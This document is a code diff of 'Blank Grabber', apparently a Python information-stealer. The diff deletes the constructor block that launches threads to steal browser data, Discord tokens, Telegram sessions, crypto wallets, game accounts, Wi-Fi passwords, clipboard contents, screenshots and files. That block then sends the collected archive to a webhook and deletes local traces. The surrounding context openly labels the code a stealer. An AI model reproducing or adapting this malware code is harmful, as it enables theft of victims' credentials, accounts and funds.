@@ -931,7 +931,7 @@ class BlankGrabber:
     EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
-    
+
     def __init__(self) -> None: # Constructor to call all the functions
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
         
@@ -946,45 +946,6 @@ class BlankGrabber:
             if not os.path.isdir(self.TempFolder):
                 os.makedirs(self.TempFolder, exist_ok= True)
                 break
-        
-        for func, daemon in (
-            (self.StealBrowserData, False),
-            (self.StealDiscordTokens, False),
-            (self.StealTelegramSessions, False),
-            (self.StealWallets, False),
-            (self.StealMinecraft, False),
-            (self.StealEpic, False),
-            (self.StealGrowtopia, False),
-            (self.StealSteam, False),
-            (self.StealUplay, False),
-            (self.GetAntivirus, False),
-            (self.GetClipboard, False),
-            (self.GetTaskList, False),
-            (self.GetDirectoryTree, False),
-            (self.GetWifiPasswords, False),
-            (self.StealSystemInfo, False),
-            (self.BlockSites, False),
-            (self.TakeScreenshot, True),
-            (self.Webshot, True),
-            (self.StealCommonFiles, True)
-        ):
-            thread = Thread(target= func, daemon= daemon)
-            thread.start()
-            Tasks.AddTask(thread) # Adds all the threads to the task queue
-        
-        Tasks.WaitForAll() # Wait for all the tasks to complete
-        Logger.info("All functions ended")
-        if Errors.errors: # If there were any errors during the process, then save the error messages into a file
-            with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
-                file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
-        self.SendData() # Send all the data to the webhook
-        try:
-            Logger.info("Removing archive")
-            os.remove(self.ArchivePath) # Remove the archive from the system
-            Logger.info("Removing temporary folder")
-            shutil.rmtree(self.TempFolder) # Remove the temporary folder from the system
-        except Exception:
-            pass
 
     @Errors.Catch
     def StealCommonFiles(self) -> None: # Steals common files from the system
